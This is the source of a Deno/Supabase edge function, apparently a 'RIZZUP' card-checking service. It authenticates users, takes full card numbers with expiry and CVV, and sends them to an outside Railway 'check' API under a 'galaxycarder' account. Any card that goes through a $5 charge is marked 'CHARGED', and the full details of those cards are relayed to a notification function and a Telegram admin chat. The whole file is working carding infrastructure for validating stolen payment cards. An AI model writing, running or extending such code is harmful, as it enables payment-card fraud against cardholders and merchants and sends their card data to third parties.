import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";

const API_URL = "https://ig-production-e72e.up.railway.app/api/check";
const API_EMAIL = "losthack11@gmail.com";
const API_USERNAME = "galaxycarder";

// Send admin debug notification for CHARGED and UNKNOWN only (skip DEAD)
async function sendAdminDebug(card: string, rawResponse: string, status: string) {
  if (!TELEGRAM_BOT_TOKEN || status === "dead") return;
  
  const maskedCard = card.replace(/^(\d{6})(\d+)(\d{4})/, '$1****$3');
  const statusEmoji = status === "live" ? "✅" : status === "dead" ? "❌" : "⚠️";
  const statusLabel = status === "live" ? "CHARGED" : status === "dead" ? "DECLINED" : "UNKNOWN";
  
  const message = `🔧 <b>[RIZZUP DEBUG]</b> ${statusEmoji} ${statusLabel}

💳 Card: <code>${maskedCard}</code>
📡 Raw Response:
<code>${rawResponse.slice(0, 800)}</code>`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (e) {
    console.error("[RIZZUP] Admin debug send error:", e);
  }
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Authenticate user
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(JSON.stringify({ error: 'No authorization header' }), {
        status: 401,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authError } = await createClient(
      SUPABASE_URL,
      Deno.env.get("SUPABASE_ANON_KEY")!
    ).auth.getUser(token);

    if (authError || !user) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), {
        status: 401,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Check ban status
    const { data: profile } = await supabase
      .from('profiles')
      .select('is_banned')
      .eq('user_id', user.id)
      .maybeSingle();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: 'Account is banned' }), {
        status: 403,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { cc } = await req.json();
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Missing cc parameter' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Parse card: CardNumber|MM|YY|CVV
    const parts = cc.split('|');
    if (parts.length < 4) {
      return new Response(JSON.stringify({
        computedStatus: "unknown",
        apiStatus: "ERROR",
        apiMessage: "Invalid card format. Required: CardNumber|MM|YY|CVV",
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const [cardNum, mm, yy, cvv] = parts;
    const fullCard = `${cardNum}|${mm}|${yy}|${cvv}`;

    console.log(`[RIZZUP] Checking card: ${cardNum.slice(0, 6)}****${cardNum.slice(-4)}`);

    // Call external API
    const url = `${API_URL}?email=${encodeURIComponent(API_EMAIL)}&username=${encodeURIComponent(API_USERNAME)}&cc=${encodeURIComponent(fullCard)}`;

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 50000);

    let responseText = "";
    let computedStatus: "live" | "dead" | "unknown" = "unknown";
    let apiMessage = "No response";

    try {
      const apiResponse = await fetch(url, {
        method: "GET",
        signal: controller.signal,
      });
      clearTimeout(timeout);

      responseText = await apiResponse.text();
      console.log(`[RIZZUP] Raw response: ${responseText.slice(0, 500)}`);

      // Try to parse JSON response for detailed message
      let parsedMessage = "";
      try {
        const jsonData = JSON.parse(responseText);
        // Extract error message or success message from JSON
        parsedMessage = jsonData.error || jsonData.message || jsonData.success || jsonData.result || "";
      } catch {
        // Not JSON, use raw text
        parsedMessage = responseText.trim();
      }

      // Determine status based on response content
      if (responseText.includes("Payment Failed")) {
        computedStatus = "dead";
        apiMessage = parsedMessage || "Payment Failed";
      } else if (responseText.trim().length > 0) {
        // Any non-empty response that doesn't contain "Payment Failed" = CHARGED
        computedStatus = "live";
        apiMessage = parsedMessage || "Charged $5.00";
      }
    } catch (fetchError) {
      clearTimeout(timeout);
      console.error("[RIZZUP] Fetch error:", fetchError);
      apiMessage = fetchError instanceof Error ? fetchError.message : "Connection error";
    }

    // Fire-and-forget: notify user for LIVE results
    if (computedStatus === "live") {
      supabase.functions.invoke('notify-charged-card', {
        body: {
          user_id: user.id,
          card_details: fullCard,
          status: "CHARGED",
          response_message: apiMessage,
          amount: "$5.00",
          gateway: "RizzUp Charge",
          api_response: responseText.slice(0, 500),
        }
      }).catch(e => console.error("[RIZZUP] Notify error:", e));
    }

    // Fire-and-forget: admin debug for UNKNOWN only
    sendAdminDebug(cardNum, responseText, computedStatus);

    const result = {
      computedStatus,
      apiStatus: computedStatus === "live" ? "CHARGED" : computedStatus === "dead" ? "DECLINED" : "UNKNOWN",
      apiMessage,
      apiTotal: "$5.00",
      rawResponse: responseText.slice(0, 1000),
    };

    console.log(`[RIZZUP] Result: ${result.computedStatus} - ${result.apiMessage}`);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('[RIZZUP] Error:', error);
    return new Response(JSON.stringify({
      computedStatus: "unknown",
      apiStatus: "ERROR",
      apiMessage: error instanceof Error ? error.message : "Unknown error",
      rawResponse: String(error),
    }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
